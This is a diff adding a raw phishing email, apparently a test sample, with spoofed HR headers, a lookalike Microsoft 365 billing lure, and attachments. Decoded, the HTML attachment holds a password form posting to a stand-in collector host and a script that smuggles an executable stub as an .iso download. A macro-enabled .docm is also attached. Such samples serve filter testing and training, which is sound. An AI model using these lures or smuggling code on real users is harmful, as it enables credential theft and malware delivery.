@@ -1,0 +1,129 @@
+Received: from AM9PR04MB8412.eurprd04.prod.outlook.com (2603:10a6:20b:3e1::14) by
+ DB9PR04MB9618.eurprd04.prod.outlook.com with HTTPS; Wed, 14 Oct 2026 10:18:24 +0000
+Received: from DB8EUR05FT021.eop-eur05.prod.protection.outlook.com (2603:10a6:20b:3e1::4)
+ by AM9PR04MB8412.eurprd04.prod.outlook.com (2603:10a6:20b:3e1::14) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.7;
+ Wed, 14 Oct 2026 10:18:21 +0000
+Received: from mx.bulk-relay.example (76.74.52.17) by
+ DB8EUR05FT021.mail.protection.outlook.com (40.107.22.81) with Microsoft SMTP
+ Server id 15.20.7 via Frontend Transport; Wed, 14 Oct 2026 10:18:20 +0000
+Received: from vps-31.host.example (unknown [159.89.10.20]) by mx.bulk-relay.example
+ (Postfix) with SMTP id 4F2A1C; Wed, 14 Oct 2026 10:05:06 +0000
+Authentication-Results: spf=fail (sender IP is 76.74.52.17)
+ smtp.mailfrom=mailer-x.example; dkim=pass (signature was verified)
+ header.d=mailer-x.example;dmarc=fail action=quarantine
+ header.from=yourc0.com;compauth=fail reason=000
+Received-SPF: Fail (protection.outlook.com: domain of mailer-x.example does not
+ designate 76.74.52.17 as permitted sender) receiver=protection.outlook.com;
+ client-ip=76.74.52.17; helo=mx.bulk-relay.example;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mailer-x.example; s=s1;
+ h=from:reply-to:subject:date; bh=placeholder; b=placeholder
+Return-Path: bounce@mailer-x.example
+From: "HR Department" <hr@yourc0.com>
+Reply-To: payroll.desk@gmail.com
+To: ravi@yourco.com
+Delivered-To: ravi@yourco.com
+Subject: =?UTF-8?B?U2FsYXJ5IHJldmlzaW9uIFE0IOKAkyBhY3Rpb24gcmVxdWlyZWQ=?=
+Date: Wed, 14 Oct 2026 10:05:02 +0000
+Message-ID: <20261014100502.4F2A1C@vps-31.host.example>
+X-Mailer: PHPMailer 5.2.4 (https://github.com/PHPMailer/PHPMailer)
+X-Originating-IP: [159.89.10.20]
+X-MS-Exchange-Organization-SCL: 6
+X-MS-Exchange-Organization-PCL: 8
+X-MS-Exchange-Organization-AVStamp-Service: 1.0
+X-Forefront-Antispam-Report: CIP:76.74.52.17;CTRY:US;LANG:en;SCL:6;SRV:;
+ IPV:NLI;SFV:SPM;H:mx.bulk-relay.example;PTR:InfoNoRecords;CAT:PHSH;SFTY:9.25;SFS:;DIR:INB;
+X-Microsoft-Antispam: BCL:1;
+X-MS-Exchange-CrossTenant-AuthAs: Anonymous
+X-MS-Exchange-CrossTenant-AuthSource: DB8EUR05FT021.eop-eur05.prod.protection.outlook.com
+X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
+X-MS-Exchange-Organization-Network-Message-Id: 6b1f2c3d-0000-4000-8000-123456789abc
+X-MS-Exchange-CrossTenant-Id: 72f988bf-86f1-41af-91ab-2d7cd011db47
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIX"
+
+--MIX
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Your Microsoft 365 subscription payment failed. Verify your account: https://eur02.safelinks.protection.outlook.com/?url=3Dhttps%3A%2F%2Flogin-micros0ft.example%2Fauth%2Fverify%3Fuser%3Dravi&data=3D05%7C01&reserved=3D0
+
+--ALT
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OlNlZ29lIFVJIj4KPGRpdiBzdHlsZT0iZGlz
+cGxheTpub25lIj5RdWFydGVybHkgbmV3c2xldHRlciB0ZWFtIGx1bmNoIHNjaGVkdWxlIHdlYXRo
+ZXIgdXBkYXRlIGhvbGlkYXkgY2FsZW5kYXIgcmVtaW5kZXI8L2Rpdj4KPHA+RGVhciB1c2VyLDwv
+cD4KPHA+WW91ciBNaWNyb3NvZnQgMzY1IHN1YnNjcmlwdGlvbiBwYXltZW50IGZhaWxlZCBhbmQg
+eW91ciBhY2NvdW50IHdpbGwgYmUgc3VzcGVuZGVkIHdpdGhpbiAyNCBob3Vycy4KUGxlYXNlIHZl
+cmlmeSB5b3VyIGFjY291bnQgdG8gYXZvaWQgaW50ZXJydXB0aW9uLjwvcD4KPHA+PGEgaHJlZj0i
+aHR0cHM6Ly9ldXIwMi5zYWZlbGlua3MucHJvdGVjdGlvbi5vdXRsb29rLmNvbS8/dXJsPWh0dHBz
+JTNBJTJGJTJGbG9naW4tbWljcm9zMGZ0LmV4YW1wbGUlMkZhdXRoJTJGdmVyaWZ5JTNGdXNlciUz
+RHJhdmkmZGF0YT0wNSU3QzAxJnJlc2VydmVkPTAiPmh0dHBzOi8vcG9ydGFsLm9mZmljZS5jb20v
+YmlsbGluZzwvYT48L3A+CjxwPllvdSBjYW4gYWxzbyA8YSBocmVmPSJodHRwczovL3VybGRlZmVu
+c2UucHJvb2Zwb2ludC5jb20vdjIvdXJsP3U9aHR0cHMtM0FfX2JpdC5seV8zZmFrZVgmZD1Ed01G
+YVEmYz1hYmMmcj1kZWYmbT1naGkmcz1qa2wmZT0iPnJldmlldyB0aGUgaW52b2ljZTwvYT4gb3Ig
+c2NhbiB0aGUgYXR0YWNoZWQgY29kZSB3aXRoIHlvdXIgcGhvbmUuPC9wPgo8aW1nIHNyYz0iaHR0
+cDovL3RyYWNrLm1haWxlci14LmV4YW1wbGUvby5naWY/aWQ9ODgyMTMiIHdpZHRoPSIxIiBoZWln
+aHQ9IjEiPgo8cD5NaWNyb3NvZnQgMzY1IEJpbGxpbmcgVGVhbTwvcD48L2JvZHk+PC9odG1sPg==
+--ALT--
+--MIX
+Content-Type: text/html; name="invoice_88213.htm"
+Content-Disposition: attachment; filename="invoice_88213.htm"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL2NvbGxlY3QubWljcm9zMGZ0LXN1cHBv
+cnQuZXhhbXBsZS9wIiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0i
+cHciPjwvZm9ybT4KPHNjcmlwdD52YXIgZD1hdG9iKCJUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FB
+QUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWdB
+QUFBQT09Iik7CnZhciBiPW5ldyBCbG9iKFtkXSx7dHlwZToiYXBwbGljYXRpb24vb2N0ZXQtc3Ry
+ZWFtIn0pO3ZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImEiKTthLmhyZWY9VVJMLmNyZWF0
+ZU9iamVjdFVSTChiKTthLmRvd25sb2FkPSJJbnZvaWNlXzg4MjEzLmlzbyI7YS5jbGljaygpOzwv
+c2NyaXB0PjwvYm9keT48L2h0bWw+
+--MIX
+Content-Type: image/png; name="scan-to-pay.png"
+Content-Disposition: attachment; filename="scan-to-pay.png"
+Content-Transfer-Encoding: base64
+
+iVBORw0KGgoAAAANSUhEUgAAAZoAAAGaAQAAAAAefbjOAAADIUlEQVR4nO2cQW7jOBBFXzUFZEkB
+PoCPIt0gZ5oj9Q2ko/QBAohLAzT+LEjKdtJAI/CM7JaLCyOO+eAizLB+fZZj4ttj/vF9BhxyyCGH
+HHLIoX1CVkcHc382GwEbk5mNnA1SmzA+JDyHtocGSdICDL86gLMBQZrSm2wkSJJ0C20XnkPbQ6ke
+AGZHSVPqgHgy5uPJACgnyKPCc+hxUDkjYkZTehMQvtanf9uaHLoLiiezMXXYGDM2cjZN/887OfSM
+EEUfVB0RBDEDUZKU0UQoL1zNm558TQ7dA3GtGAliWH730Cb4jtg9VNTilVSY+4AgU5VlH4B4qyWe
+fE0O3QO1rLEArBliipKmmGFQppSltBLUz4iXgKLEoJPZGE/NobqZqImzO1QvAFWPYTYQqQcIMpKt
+Px3E/C5sWPqWXZ58TQ79B9CgDPMxo3960BQlSNWZKGPug3uWLwBRpQHAsIRmZS/UXVLqD0mtInUd
+sXPoRlmuUnKKmeZCVGVZt4rviL1Dq0OVudgO1aSMKi52O0HWA+XJ1+TQPdDqRwTZfBRG/OggfnQi
+dVnzeDZByJBCkxRPviaH7oHan32ULo51SyJa7YlcEoZnjf1DNLnYPvOSJmLVFkVRTLRM4jti91Dz
+I94XGamH4ecBSIZIIRux1pzuR7wIdH33Wc6DeKk5M58uwl1Z7h9aPcuQIb3JasfMgkgHQVyw9WHz
+8BzaHFo75c4G8aN00Km42DFjYOWp5newYdo2PIc2h678iHrFuVqTWmgdM8WzzJ41XgyajxlIVltt
+S1ddPBmzmdVu3AeG59Am0JWLXYrMW6F50z6Vvfp8AWj1LAWDwMrTdMjt7lNFPRjpINs6PIc2h8qO
+qJ80IWseQ7byq7hQPIqyQTib+xH7h770Yl/6beur12amZ439Q9e34WUfxLVdYt0HZUTXES8JrZ0S
+mlKHpJNd7sUfH55Dm0Nz+wp4rT5TB8OvWn1WU/tvW5ND3xjNY4gCEmgeAVJXbrU09yEz9yHbsBy2
+D8+hzaEv3+ki6rY/gptOO9cRe4dMf57zefh/JnPIIYcccsghhwD+BfGsXyg1Rl4vAAAAAElFTkSu
+QmCC
+--MIX
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Statement_Q4.docm"
+Content-Disposition: attachment; filename="Statement_Q4.docm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAOaZT11W4zNKpgAAANcAAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbD2OOw7CMBBE
+r2K5RfEGCgrkJAWiBQousNhLYhF/ZJsAt8cGiXI1+96MHF52ZgvFZLzr+Fq0fOjl5R0osZK41PEp
+57ADSGoii0n4QK4kNx8t5nLGEQKqO44Em7bdgvIuk8tNrg7ey1ORR6OJnTHmI1rqODx91KC9etjy
+KYqNs/0Pq80dxxBmozCXTbA4LWxqKiL+iEUV/cHhdaaSonGrKoFewnd6/wFQSwMEFAAAAAgA5plP
+Xd1ahg0PAAAADQAAABEAAAB3b3JkL2RvY3VtZW50LnhtbLMpt0rJTy7NTc0r0bcDAFBLAwQUAAAA
+CADmmU9dwdiHshYAAAAUAAAAEwAAAHdvcmQvdmJhUHJvamVjdC5iaW67cF7wQVpidqpuWVKibkFR
+flZqcgkAUEsDBBQAAAAIAOaZT13ZvHNttwAAADoBAAAcAAAAd29yZC9fcmVscy9zZXR0aW5ncy54
+bWwucmVsc42QvQ7CMAyEX6XKTlwQYkBtWWBgYEG8gJW4P6L5ITGovD2WAAkkBkbf+T6fXG0mNxY3
+SnkIvlZzXapNUx1pRBYh90PMhWz4XKueOa4BsunJYdYhkhenDckhy5g6iGjO2BEsynIF6ZOhvpnF
+3tYq7e1cFad7pH/YoW0HQ9tgro48/zgByIyStydyUXQSNqaO+EnPgueXk7WxfvYkappQVILLUtvA
+7p06BCu9dhNT8jgqaCr4+krzAFBLAQIUAxQAAAAIAOaZT11W4zNKpgAAANcAAAATAAAAAAAAAAAA
+AACAAQAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAhQDFAAAAAgA5plPXd1ahg0PAAAADQAAABEA
+AAAAAAAAAAAAAIAB1wAAAHdvcmQvZG9jdW1lbnQueG1sUEsBAhQDFAAAAAgA5plPXcHYh7IWAAAA
+FAAAABMAAAAAAAAAAAAAAIABFQEAAHdvcmQvdmJhUHJvamVjdC5iaW5QSwECFAMUAAAACADmmU9d
+2bxzbbcAAAA6AQAAHAAAAAAAAAAAAAAAgAFcAQAAd29yZC9fcmVscy9zZXR0aW5ncy54bWwucmVs
+c1BLBQYAAAAABAAEAAsBAABNAgAAAAA=
+--MIX--
